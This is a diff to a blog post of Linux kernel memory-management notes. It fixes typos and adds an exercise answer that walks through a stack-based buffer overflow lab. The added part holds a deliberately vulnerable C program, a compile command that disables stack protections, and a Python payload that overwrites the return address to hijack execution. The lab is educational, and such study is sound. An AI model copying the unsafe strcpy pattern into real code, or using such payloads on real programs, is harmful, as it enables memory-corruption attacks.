@@ -37,7 +37,7 @@ tags: [linux, kernel]
     - They are managed using list called "pgdat_list"
   - Linux can access the Physical Memory using consistent Node structure no matter what the system is.
     - "pg_data_t" structure is used.
-      - "node_present_pages": actual size of the phyiscal memory in the node
+      - "node_present_pages": actual size of the physical memory in the node
       - "node_start_pfn": the index number of the physical memory in the memory map
       - "node_zones": zone structure
       - "nr_zones": the number of zones
@@ -52,7 +52,7 @@ tags: [linux, kernel]
   - Zones are several regions of the physical memory for the Node.
     - "/include/linux/mmzone.h"
   - The memory in the same zone has the same properties.
-  - The memory in the different zone should be managed seperately.
+  - The memory in the different zone should be managed separately.
 
   | Region    | Zone name              | Description
   | --------- | ---------------------- | -----------
@@ -67,7 +67,7 @@ tags: [linux, kernel]
     - "watermark" and "vm_stat" determine appropriate memory freeing policy at memory shortage.
       - On the memory shortage, the processes failed to fetch memory are put into "wait_queue" with hashing on "wait_table" variable.
 
-  ```termainl
+  ```terminal
   $ cat /proc/zoneinfo
   Node 0, zone      DMA
     per-node stats
@@ -357,3 +357,78 @@ tags: [linux, kernel]
 
 - Slab Allocator
   - Internal Fragmentation
+
+
+- [Exercise 2. Answer: Understanding Stack based buffer overflow](<https://payatu.com/blog/Siddharth-Bezalwar/understanding-stack-based-buffer-overflow>){:target="_blank"}
+
+  ```cpp
+  #include <string.h>
+  #include <stdio.h>
+
+  void function2() {
+    printf(“Execution flow changed\n”);
+  }
+
+  void function1(char *str){
+    char buffer[5];
+    strcpy(buffer, str);  // break point 1.
+  }                       // break point 2.
+
+  void main(int argc, char *argv[])
+  {
+    function1(argv[1]);   // break point 3.
+    printf(“Executed normally\n”);
+  }
+  ```
+
+  ```terminal
+  gcc -g -fno-stack-protector -z execstack -o bufferoverflow overflow.c
+  ```
+
+  - -g tells GCC to add extra information for GDB
+  - -fno-stack-protector flag to turn off stack protection mechanism
+  - -z execstack, it makes stack executable.
+
+  ```terminal
+  $ ./bufferoverflow AAAA
+  Executed normally
+  $ ./bufferoverflow AAAAAAAAAAAAAAAAAAAAAA
+  Segmentation fault
+  ```
+
+  - break point 3.
+
+    ![break point 3.]({{ "/assets/images/posts/2020-12-07/breakpoint3-1.png" | relative_url }})
+    
+  - break point 1.
+
+    ![break point 1.]({{ "/assets/images/posts/2020-12-07/breakpoint1.png" | relative_url }})
+
+  - break point 2.
+
+    ![break point 2.]({{ "/assets/images/posts/2020-12-07/breakpoint2.png" | relative_url }})
+
+  - Return address, EBP and ESP on function stack frame
+
+    ![EBP and ESP on function stack frame]({{ "/assets/images/posts/2020-12-07/esp_ebp_on_func_call_stack.png" | relative_url }})
+
+  - break point 3.
+
+    When you overwrite the return address with As you will get segmentation fault with message 0x41414141 in ?? () in GDB. This means you successfully overwritten the return address.
+
+    ![break point 3.]({{ "/assets/images/posts/2020-12-07/breakpoint3-2.png" | relative_url }})
+
+  - Hijacking Execution
+    - Find the function2 address
+
+      ![function 2 address]({{ "/assets/images/posts/2020-12-07/function2address.png" | relative_url }})
+
+    - Overwrite Return address with the function 2 address
+
+      ![run with function 2 address]({{ "/assets/images/posts/2020-12-07/run_function2address.png" | relative_url }})
+
+    ```terminal
+    $ ./bufferoverflow $(python -c 'print "A"*17 + "\x1b\x84\x04\x08"')
+    Execution flow changed
+    Segmentation fault
+    ```
